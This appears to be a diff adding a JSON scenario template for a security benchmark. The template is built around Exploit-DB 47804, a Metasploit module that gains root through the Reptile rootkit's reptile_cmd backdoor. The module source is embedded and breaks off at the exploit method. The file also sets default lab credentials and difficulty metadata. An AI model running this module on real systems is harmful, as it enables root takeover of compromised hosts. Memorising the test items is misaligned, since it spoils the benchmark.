@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_47804",
+  "category": "E1_docker_escape",
+  "attack_technique": "T1611",
+  "cwe": "CWE-268",
+  "description": "Linux privilege escalation: Reptile Rootkit - reptile_cmd Privilege Escalation (Metasploit)\n\nExploit source code (47804.rb):\n```\n##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Reptile Rootkit reptile_cmd Privilege Escalation',\n      'Description'    => %q{\n        This module uses Reptile rootkit's `reptile_cmd` backdoor executable\n        to gain root privileges using the `root` command.\n\n        This module has been tested successfully with Reptile from `master`\n        branch (2019-03-04) on Ubuntu 18.04.3 (x64) and Linux Mint 19 (x64).\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'f0rb1dd3n', # Reptile\n          'bcoles'     # Metasploit\n        ],\n      'DisclosureDate' => '2018-10-29', # Reptile first stable release\n      'References'     =>\n        [\n          ['URL', 'https://github.com/f0rb1dd3n/Reptile'],\n          ['URL', 'https://github.com/f0rb1dd3n/Reptile/wiki/Usage']\n        ],\n      'Platform'       => ['linux'],\n      'Arch'           => [ARCH_X86, ARCH_X64],\n      'SessionTypes'   => ['shell', 'meterpreter'],\n      'Targets'        => [['Auto', {}]],\n      'Notes'          =>\n        {\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'Stability'   => [ CRASH_SAFE ]\n        },\n      'DefaultTarget'  => 0))\n    register_options [\n      OptString.new('REPTILE_CMD_PATH', [true, 'Path to reptile_cmd executable', '/reptile/reptile_cmd'])\n    ]\n    register_advanced_options [\n      OptBool.new('ForceExploit', [false, 'Override check result', false]),\n      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])\n    ]\n  end\n\n  def reptile_cmd_path\n    datastore['REPTILE_CMD_PATH']\n  end\n\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def upload(path, data)\n    print_status \"Writing '#{path}' (#{data.size} bytes) ...\"\n    rm_f path\n    write_file path, data\n    register_file_for_cleanup path\n  end\n\n  def upload_and_chmodx(path, data)\n    upload path, data\n    chmod path\n  end\n\n  def check\n    unless executable? reptile_cmd_path\n      vprint_error \"#{reptile_cmd_path} is not executable\"\n      return CheckCode::Safe\n    end\n    vprint_good \"#{reptile_cmd_path} is executable\"\n\n    res = cmd_exec(\"echo id|#{reptile_cmd_path} root\").to_s.strip\n    vprint_status \"Output: #{res}\"\n\n    if res.include?('You have no power here!')\n      vprint_error 'Reptile kernel module is not loaded'\n      return CheckCode::Safe\n    end\n\n    unless res.include?('root')\n      vprint_error 'Reptile is not installed'\n      return CheckCode::Safe\n    end\n    vprint_good 'Reptile is installed and loaded'\n\n    CheckCode::Vulnerable\n  end\n\n  def exploit\n    unless check == CheckCode::Vulnerable\n  \n```",
+  "cve": "",
+  "exploitdb_id": "47804",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_47804",
+      "type": "core",
+      "difficulty": "hard"
+    }
+  ]
+}
